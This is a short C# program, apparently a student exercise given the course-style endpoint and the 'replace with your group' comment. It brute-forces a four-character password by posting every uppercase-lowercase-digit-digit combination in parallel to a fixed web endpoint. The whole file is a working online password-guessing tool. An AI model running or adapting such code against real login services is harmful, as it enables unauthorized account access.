using System;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

class Program
{
    static async Task Main(string[] args)
    {
        var httpClient = new HttpClient();
        string url = "https://fiapnet.azurewebsites.net/fiap";
        string grupo = "12";  // Substitua pelo seu grupo

        char[] letrasMaiusculas = "ABCDEFGHIJKLMNOPQRSTUVWXYZ".ToCharArray();
        char[] letrasMinusculas = "abcdefghijklmnopqrstuvwxyz".ToCharArray();
        char[] numeros = "0123456789".ToCharArray();

        // Parallel.For para tentar diferentes combinações de senha em paralelo
        Parallel.For(0, letrasMaiusculas.Length, (i, state) =>
        {
            for (int j = 0; j < letrasMinusculas.Length; j++)
            {
                for (int k = 0; k < numeros.Length; k++)
                {
                    for (int l = 0; l < numeros.Length; l++)
                    {
                        string senha = $"{letrasMaiusculas[i]}{letrasMinusculas[j]}{numeros[k]}{numeros[l]}";
                        var response = TentarSenha(httpClient, url, grupo, senha).Result;

                        if (response)
                        {
                            Console.WriteLine($"Senha encontrada: {senha}");
                            state.Stop();  // Para todas as threads
                            return;
                        }
                    }
                }
            }
        });

        httpClient.Dispose();
        Console.WriteLine("Processo finalizado.");
    }

    static async Task<bool> TentarSenha(HttpClient httpClient, string url, string grupo, string senha)
    {
        var data = new { Key = senha, grupo = grupo };
        var jsonContent = new StringContent(JsonSerializer.Serialize(data), Encoding.UTF8, "application/json");

        try
        {
            var response = await httpClient.PostAsync(url, jsonContent);
            if (response.IsSuccessStatusCode)
            {
                // Aqui você pode verificar se a senha foi correta, dependendo da resposta esperada
                string responseBody = await response.Content.ReadAsStringAsync();
                Console.WriteLine($"{response.StatusCode} {responseBody}");
                return responseBody.Contains("senha correta");  // Ajuste conforme a resposta correta
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Erro ao tentar senha {senha}: {ex.Message}");
        }

        return false;
    }
}
